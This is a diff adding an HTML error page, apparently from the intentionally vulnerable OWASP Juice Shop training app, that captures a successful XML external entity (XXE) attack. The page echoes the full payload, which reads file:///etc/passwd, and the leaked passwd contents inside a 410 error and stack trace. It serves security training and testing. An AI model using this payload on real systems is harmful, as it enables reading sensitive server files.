@@ -1,0 +1,49 @@
+<html>
+  <head>
+    <meta charset='utf-8'> 
+    <title>Error: B2B customer complaints via file upload have been deprecated for security reasons: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</title>
+    <style>* {
+  margin: 0;
+  padding: 0;
+  outline: 0;
+}
+
+body {
+  padding: 80px 100px;
+  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
+  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
+  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
+  background-repeat: no-repeat;
+  color: #555;
+  -webkit-font-smoothing: antialiased;
+}
+h1, h2 {
+  font-size: 22px;
+  color: #343434;
+}
+h1 em, h2 em {
+  padding: 0 5px;
+  font-weight: normal;
+}
+h1 {
+  font-size: 60px;
+}
+h2 {
+  margin-top: 10px;
+}
+ul li {
+  list-style: none;
+}
+#stacktrace {
+  margin-left: 60px;
+}
+</style>
+  </head>
+  <body>
+    <div id="wrapper">
+      <h1>Juice Shop (Express ~4.16)</h1>
+      <h2><em>410</em> Error: B2B customer complaints via file upload have been deprecated for security reasons: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</h2>
+      <ul id="stacktrace"><li>&lt;!DOCTYPE foo [</li><li>&lt;!ELEMENT foo ANY&gt;</li><li>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</li><li>]&gt;</li><li>&lt;creds&gt;&lt;user&gt;root:x:0:0:root:/root:/bin/bash</li><li>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</li><li>bin:x:2:2:bin:/bin:/usr/sbin/nologin</li><li>sys:x:3:3:sys:/dev:/usr/sbin/nologin</li><li>sync:x:4:65534:sync:/bin:/bin/sync</li><li>games:x:5:60:games:/usr/games:/usr/sbin/nologin</li><li>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</li><li>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</li><li>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</li><li>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</li><li>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</li><li>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</li><li>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</li><li>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</li><li>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</li><li>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</li><li>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</li><li>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</li><li>systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false</li><li>systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false</li><li>systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false</li><li>systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false</li><li>node:x:1000:1000::/home/node:/bin/bash</li><li>messagebus:x:104:108::/var/run/dbus:/bin/false</li><li>&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</li><li> (exploit.xml)</li><li> &nbsp; &nbsp;at /opt/kwik-e-mart/routes/fileUpload.js:32:16</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/opt/kwik-e-mart/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/opt/kwik-e-mart/node_modules/express/lib/router/route.js:137:13)</li><li> &nbsp; &nbsp;at Array.&lt;anonymous&gt; (/opt/kwik-e-mart/node_modules/multer/lib/make-middleware.js:53:37)</li><li> &nbsp; &nbsp;at listener (/opt/kwik-e-mart/node_modules/on-finished/index.js:169:15)</li><li> &nbsp; &nbsp;at onFinish (/opt/kwik-e-mart/node_modules/on-finished/index.js:100:5)</li><li> &nbsp; &nbsp;at callback (/opt/kwik-e-mart/node_modules/ee-first/index.js:55:10)</li><li> &nbsp; &nbsp;at IncomingMessage.onevent (/opt/kwik-e-mart/node_modules/ee-first/index.js:93:5)</li><li> &nbsp; &nbsp;at IncomingMessage.emit (events.js:180:13)</li><li> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:1106:12)</li><li> &nbsp; &nbsp;at process._tickCallback (internal/process/next_tick.js:178:19)</li></ul>
+    </div>
+  </body>
+</html>
